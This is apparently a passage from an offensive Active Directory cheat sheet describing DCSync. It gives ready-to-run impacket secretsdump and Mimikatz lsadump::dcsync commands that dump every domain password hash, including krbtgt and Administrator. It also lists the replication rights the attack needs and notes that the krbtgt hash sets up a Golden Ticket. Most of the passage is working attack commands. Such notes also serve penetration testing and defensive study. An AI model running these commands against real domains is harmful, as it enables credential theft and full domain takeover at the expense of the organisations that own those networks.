**Domain Controllers replicate their password database to each other.** DCSync abuses that: if your account has replication rights (you earn them via ACL abuse, ADCS, or after reaching DA), you pretend to be a DC and politely ask the real DC for everyone's password hashes — including `krbtgt` and Administrator. It's the standard way to "dump the whole domain" without touching the DC's disk. Grabbing `krbtgt` here also sets up the Golden Ticket below.

```
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator

# Mimikatz:
lsadump::dcsync /user:krbtgt /domain:corp.local
lsadump::dcsync /all /domain:corp.local
```

## Required replication rights

The principal performing DCSync needs replication permissions such as:

```text
Replicating Directory Changes
Replicating Directory Changes All
Replicating Directory Changes in Filtered Set
```

By default, highly privileged groups such as **Domain Admins**, **Enterprise Admins**, and **Administrators** have the required rights. A non-member can also DCSync if these rights are explicitly delegated.

## Target one user

```bash
impacket-secretsdump -just-dc-user <USER> \
  <DOMAIN>/<PRIV_USER>:'<PASSWORD>'@<DC_IP>
```

Windows / Mimikatz:

```text
lsadump::dcsync /user:<DOMAIN>\<USER>
```

DCSync uses AD replication rather than reading `ntds.dit` directly from disk, so it can retrieve the NTLM hash (and other key material) for domain users remotely when the caller has the required rights.
